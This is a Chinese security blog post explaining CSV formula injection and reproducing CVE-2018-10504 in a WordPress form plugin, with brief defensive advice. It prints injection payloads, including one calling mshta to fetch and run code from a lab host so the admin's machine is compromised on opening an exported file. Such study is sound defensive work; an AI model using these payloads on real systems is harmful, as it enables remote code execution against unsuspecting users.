***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 背景

 **某天在逛expdb时候看到了CSV
Injection的exp，在渗透测试的过程中也偶尔会遇到类似的情况，这一漏洞很早之前就出现过，但是很多人没有意识到漏洞的危害性，于是抱着学习的心态进行了一波漏洞复现和学习。**

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550044879_5c63cecf544b4.png!small)

## 漏洞介绍

 **CSV公式注入(CSV Injection）**
是一种会造成巨大影响的攻击向量。攻击包含向恶意的EXCEL公式中注入可以输出或以CSV文件读取的参数。当在Excel中打开CSV文件时，文件会从CSV描述转变为原始的Excel格式，包括Excel提供的所有动态功能。在这个过程中，CSV中的所有Excel公式都会执行。当该函数有合法意图时，很易被滥用并允许恶意代码执行。

## 漏洞原理

人们通常认为CSV或xls文件中包含的文本不会有任何安全风险，这是比较大的一个误区。首先我们创建一个Excel文件，将其中一格内容修改为 **=36+1**

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045059_5c63cf83da978.png!small)

保存之后看到如下结果，公式正常计算：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045128_5c63cfc8c0f43.png!small)

虽然单元格的内容在引号内，但由于第一个字符是 **=** ，它以一个表达式的形式被处理，实际上包括 **= - + @**
这样的符号都会触发这种行为，正常来说，如果数据量比较大的情况下，管理员一般不会花那么多时间去一个个检查输入内容是否正常。（emmm正常人可能都不会这么干）

由于表达式就是可以执行的代码，所以假如我们把输入内容修改为：

    
    
    =1+cmd|' /C calc'!A0
    

之后点击保存，然后再次打开，会看到如下提示：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045287_5c63d06774420.png!small)

点击 **是** 之后，弹出计算器：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045315_5c63d0832e19d.png!small)

## 漏洞危害

这类漏洞通常不会针对于专业的网络安全人员，毕竟是个搞安全的都知道 **cmd**
不要随便启用，但是对于大部分人来说，尤其是正常的企业员工，往往会忽视问题的严重性，可能随手就点了个 **是**
，因此这类漏洞一种利用方式可以用于钓鱼，另一种也和钓鱼类似，需要网站后台存在导出excel功能，攻击者通过污染数据，当管理员或者其他用户需要用到导出excel功能时，被污染的数据被一起导出，当打开该文件时并且忽略告警提示点了
**是** ，一起完美的攻击就完成了。

## 漏洞复现

漏洞复现采用了 **CVE-2018-10504** ，也就是wordpress的Form Maker 插件的csv注入漏洞。PoC可参考：

    
    
    https://www.exploit-db.com/exploits/44559
    

首先下载安装该插件：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045628_5c63d1bcdc4d2.png!small)

安装后在功能栏就能看到：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045878_5c63d2b6be058.png!small)

我们这边用有两个用户 **admin** 和 **sunshine：**

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045886_5c63d2be5bb56.png!small)

登录 **sunshine** 用户，使用 **Form Maker** 提交如下信息：

    
    
    +1+cmd|'/c mshta.exehttp://192.168.233.102:8080/a'!A0
    

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045913_5c63d2d968fe7.png!small)后台可以看到数据已经被污染了：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045943_5c63d2f7857fa.png!small)
**admin** 用户登录，打开 **Form Maker** – **Submissions** – **Contact US** – **Export
to CSV**

 **![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045975_5c63d3178bb2d.png!small)**

打开会有这样的安全提示：

 **![Clipboard
Image.png](https://image.3001.net/images/20190213/1550045988_5c63d3241551d.png!small)**默认
**启用** 和点击 **是** 之后就能看到机器上线了：

![Clipboard
Image.png](https://image.3001.net/images/20190213/1550046006_5c63d33646f26.png!small)

## 漏洞防护

对于网站来说，比较合理的防御方式是对输入输出特殊字符进行编码；对于平时常规文件的传递中，只能尽量为员工做好相关的安全意识培训来做相关的防范。

## 参考

> <http://www.4hou.com/vulnerable/10140.html>
>
> <https://yq.aliyun.com/articles/225847>
>
> <https://www.exploit-db.com/exploits/44559>
>
> <http://www.4hou.com/technology/8321.html>

***本文原创作者：3unshine，本文属FreeBuf原创奖励计划，未经许可禁止转载**

